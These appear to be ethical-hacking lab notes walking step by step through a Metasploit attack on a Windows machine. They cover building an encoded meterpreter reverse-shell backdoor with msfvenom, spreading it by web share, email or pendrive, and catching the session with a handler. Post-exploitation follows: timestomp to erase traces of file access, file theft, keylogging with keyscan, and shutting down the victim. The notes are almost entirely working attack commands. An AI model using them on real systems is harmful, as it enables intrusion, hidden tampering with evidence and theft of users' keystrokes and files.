- Open Terminal
	> msfvenom -p windows/meterpreter/reverse_tcp --paltform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe >Desktop/Backdoor.exe

	- This will generate **Backdoor.exe**, a malicious file, on **Desktop**.
	- now we copy this into the shared directory or just send it via email or pendrives
		> cp /root/Desktop/Backdoor.exe /var/www/html/share
		> service apache2 start (to share the file)
		> msfconsole (to open metasploit framework)
		> use exploit/multi/handler (to handle exploits launched outside metasploit framework)
		> set payload windows/meterpreter/reverse_tcp
		> set LHOST 10.10.10.13
		> show options (to check the listening port)
		> exploit -j -z
		
		- now in the windows machine, enter http://#hostip/share in any browser
		- download Backdoor.exe and run it
		- now back in linux host machine
		- start meterpreter session
			> sessions -i 1
			> sysinfo (Issuing this command displays target machine information such as computer name, OS, and domain)
			> ipconfig (This displays the victim machine’s IP address, MAC address, and other information)
			> getuid (to display that the Meterpreter session is running as an administrator on the host)
			> pwd (to check current working directory)
			
			- lets say you read a file
			- While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
			- To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.
				> timestomp filename.txt -v (to view MACE attributes)
				- This displays the created time, accessed time, modified time, and entry modified time
				- To change MACE attributes
					> timestomp filename.txt -m "02/11/2022 08:10:03" (this command changes the modified value (-m) of filename.txt)
					- Similarly, you can change the **Accessed** (**-a**), **Created** (**-c**), and **Entry Modified** (**-e**) values of a particular file.
						> timestomp filename.txt -v (to confirm the changes)
						
						> cd C:/ (to go to C directory)
						> pwd (to check current working directory)
						> download filename.extension (to download any file from remote machine to host machine)
						> search -f filename.extension (to search any file) 
						
		- Now that you have successfully exploited the system, you can perform post-exploitation maneuvers such as key-logging.
			> keyscan start (to start capturing all keyboard input from target machine)
			> keyscan_dump (This dumps all captured keystrokes)
			> idletime (To check how much time the user has been idle on the remote system)
			
				- You can also type **shutdown** and press **Enter** to shut down the victim machine after performing post-exploitation.
